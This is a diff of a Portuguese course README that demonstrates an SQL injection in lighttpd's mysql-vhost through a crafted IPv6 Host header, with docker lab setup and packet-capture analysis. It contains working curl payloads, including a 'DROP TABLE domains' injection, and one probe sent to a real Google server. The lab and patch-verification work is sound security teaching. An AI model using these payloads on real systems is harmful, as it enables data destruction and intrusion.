@@ -21,7 +21,7 @@ Confirm: [http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt
 - [ ] Explicar a falha
   - [ ] apresentar o serviço a ser explorado
   - [ ] onde, no código fonte, está a falha
-  - [ ] path de correção da falha
+  - [ ] patch de correção da falha
 - [ ] Preparar demos com relação ao exploit
   - [ ] Exploit
   - [ ] Aplicar a correção da falha 
@@ -164,7 +164,7 @@ TODO
 Problemas acontecem então pelo fato que os sistemas de gerenciamento de banco de dados que utilizam SQL supõe que os comandos inseridos serão comandos de conhecimento do administrator e por ele bem geridos. Tal suposição nem sempre é verdadeira, uma vez que falhar nos sistemas que interagem com o sistema de BD pode apresentar falhas, principalmente na web, onde a interação com o usuário é grande.
 
 
-### sql injection
+### SQL Injection
 
 O problema com os comandos SQL aparecem quando passa a haver a intenção de construir os comandos usando textos que originados pelo usuário, seja um nome de usuário, senha ou qualquer outro conteúdo dinâmico.
 
@@ -210,26 +210,34 @@ Quando docker iniicia, cria uma interface virtual chamada `docker0` no host.
 TODO
 
 
-## Demo!
+## Demo
 
-A demonstração depende de um ambiente com  [docker](docker.io) propriamente instalado. Feito isto, as imagens precisam ser criadas:
+A demonstração depende de um ambiente com [docker](docker.io) propriamente configurado em uma máquina Linux. Feito isto, a imagem precisa ser criada:
 
 ```sh
-$ ./run-build-images.sh
+$ ./scripts/create-lighty-image.sh
 ```
 
-O comando acima executará, para cada imagem - debian com lighttpd vulnerável e outra com lighttpd não vulnerável - o processo de criação explícito nos `Dockerfile`s correspondentes.
+O comando acima então tratará de criar uma imagem baseado no arquivo `Dockerfile`, contendo os códigos fonte de ambas as versões do lighttpd: vulnerável e com a falha corrigida.
 
-Feito isto, podemos então instanciar os containers que representarão as instâncias de processamento que fazem parte da demo:
+Feito isto, podemos então instanciar os containers que representarão as instâncias de processamento que fazem parte da demo e o banco de dados, também isolado como um container:
 
-- um servidor de mysql escutando na porta 3306 do `lighty-mysqlserver`.
-- um servidor lighty escutando na porta 80 do  `lighty-vulnerable`.
-- um servidor lighty escutando na porta 80 do container `lighty-patched`.
+```sh
+$ ./scripts/create-mysql-container.sh
+$ ./scripts/create-lighty-container.sh vulnerable
+$ ./scripts/create-lighty-container.sh patched
+```
+
+Como resultado temos:
+
+- servidor de mysql escutando na porta 3306 do `lighty-mysqlserver`.
+- servidor lighty escutando na porta 80 do container `lighty-vulnerable`.
+- servidor lighty escutando na porta 80 do container `lighty-patched`.
 
 Para obter os IPs dos containers, basta executar o comando:
 
 ```sh
-$ ./run-getips.sh
+$ ./scripts/run-getips.sh
 
 Docker container ip Addresses:
  - lighty-vulnerable:  172.17.0.3
@@ -237,9 +245,7 @@ Docker container ip Addresses:
  - lighty-mysqlserver: 172.17.0.2
 ```
 
-As supostas máquinas estão prontas, resta apenas configurar o DNS para que a resolução de endereços seja feita corretamente.
-
-(agora poderíamos criar outro container, dedicado à resolução usando BIND, porém para agilizar podemos simplesmente editar o `/etc/hosts`):
+As 'supostas máquinas' estão prontas, resta então apenas configurar o DNS para que a resolução de endereços seja feita corretamente.  Nest momento poderíamos criar outro container, dedicado à resolução das requisições DNS usando um servidor BIND, porém para agilizar podemos simplesmente editar o `/etc/hosts`:
 
 ```
 172.17.0.3 redes.io
@@ -247,7 +253,7 @@ As supostas máquinas estão prontas, resta apenas configurar o DNS para que a r
 172.17.0.3 mac5910.io
 ```
 
-Precisamos agora fazer com que o servidor `lighttpd` seja capaz de fazer a tarefa de virtual hosting usando o servidor de mysql. Para isto precisamos inserir as entradas no servidor:
+Precisamos agora fazer com que o servidor `lighttpd` seja capaz de fazer a tarefa de *virtual hosting* usando o servidor de mysql. Para isto precisamos inserir as entradas no banco de dados de modo que nossos servidores possam então lidar com a tarefa de acordo o BD:
 
 ```sh
 $ docker exec -it lighty-mysqlserver bash
@@ -285,20 +291,20 @@ mysql> SELECT * FROM domains;
 
 A partir deste instante os servidores são capazes de realizar o virtual hosting baseado no banco de dados.
 
+
 ### Exploit
 
-O ataque consistem em explorar uma falha no parsing do cabaçalho `Host` enviado em requisições HTTP com hosts IPv6. O método responsável pelo parse permite que, além do host, outros caractéres sejam lidos e interpretados como host. O problema disto é que, como mostrado anteriormente, é que no comando de busca por um host virtual uma string de host é colocada cegamente (não realizando escaping) no comando SQL:
+O ataque consiste em explorar uma falha na fase de *parsing* do cabaçalho `Host` enviado em requisições HTTP com `Host` do tipo IPv6. O método responsável pelo parse permite que, além do host, outros caractéres sejam lidos e interpretados como tal. O problema disto é que, como mostrado anteriormente, no comando de busca por um host virtual uma string de host é colocada cegamente (não realizando escaping) no comando SQL:
 
 ```
 mysql-vhost.sql		= "SELECT docroot FROM domains WHERE domain='QUALQUER_COISA_QUE_VENHA_NO_HOST';"
 ```
 
-Um request bem intencionado apresenta então o seguinte fluxo de pacotes ao "farejarmos" a interface padrão `docker0`:
+Um request bem intencionado apresenta então o seguinte fluxo de pacotes ao "farejarmos" a interface padrão `docker0`, por onde todos os pacotes entre os containers fluem:
 
 ![Fluxo de pacotes  Ok](assets/packet-flow-ok.png)
 
-Analisando os componentes:
-
+Analisemos então cada componente do fluxo:
 
 **Requisição bem formada HTTP**
 ![Requisição HTTP Ok](assets/HTTP-request-ok.png)
@@ -317,7 +323,8 @@ Podemos então explorar tal vulnerabilidade.
 Utilizando o `curl` podemos realizar o forjar requests mal intencionados como descrito na confirmação da CVE.
 
 ```sh
-$ curl --header "Host: []' SINTAXE ERRADA" redes.io
+$ ./scripts/run-exploit1
+curl --header "Host: []' SINTAXE ERRADA" redes.io
 ```
 
 ![Erro de Servidor](assets/internal-server-error.png)
@@ -325,7 +332,9 @@ $ curl --header "Host: []' SINTAXE ERRADA" redes.io
 Podemos detectar claramente que há uma vulnerabilidade a ser explorada uma vez que não deveria ocorrer um erro interno de servidor. Testando o mesmo script para o servidor do google:
 
 ```sh
-$ curl --header "Host: []' SINTAXE ERRADA" www.google.com
+$ ./scripts/run-exploit2
+curl --header "Host: []' SINTAXE ERRADA" www.google.com
+
 <html><title>Error 400 (Bad Request)!!1</title></html>% 
 ```
 
@@ -338,10 +347,11 @@ Confirmamos que podemos explorar o banco de dados ao analisar o request feito ao
 ![Resposta requisição MySQL mal formada](assets/mysql-syntax-error-response.png)
 
 
-Podemos prosseguir então com comandos!
+Podemos prosseguir então com comandos destrutíveis!
 
 ```sh
-$ curl --header "Host: []'; DROP TABLE domains;--'" redes.io
+$ ./scripts/run-exploit3
+curl --header "Host: []'; DROP TABLE domains;--'" redes.io
 ```
 
 **Requisição HTTP maliciosa**
@@ -353,10 +363,10 @@ $ curl --header "Host: []'; DROP TABLE domains;--'" redes.io
 **Reposta MySQL**
 ![Resposta requisição MySQL maliciosa](assets/sql-injection-MySQL-response.png)
 
-E a tabela se foi!
+E a tabela se foi! Consequentemente o servidor não será capaz de resolver hosts virtuais além daquele configurado como padrão.
 
 
-### Verificação do Path
+### Verificação do Patch
 
 Podemos verificar que o patch resolve o problema primeiramente refazendo os testes incluídos:
 
